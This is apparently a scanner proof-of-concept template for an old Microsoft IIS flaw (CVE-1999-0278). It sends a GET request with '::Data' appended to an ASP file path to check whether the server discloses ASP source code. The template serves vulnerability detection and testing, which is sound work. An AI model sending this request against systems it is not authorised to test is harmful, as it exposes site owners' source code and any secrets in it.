[info]
author = "ave"
description = "检测目标 IIS 服务器是否支持通过在 ASP 文件 URL 中添加'::Data'进行 ASP 文件源代码泄露，此漏洞可导致敏感代码被远程泄露"
id = "POC-AVE-1999-0464"
name = "Microsoft IIS ASP Alternate Data Streams Source Code Disclosure"
severity = "medium"
tags = ["ave-1999-0464"]
vuln_id = [
    "CVE-1999-0278",
    "AVE-1999-0464",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/asp_file::Data"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
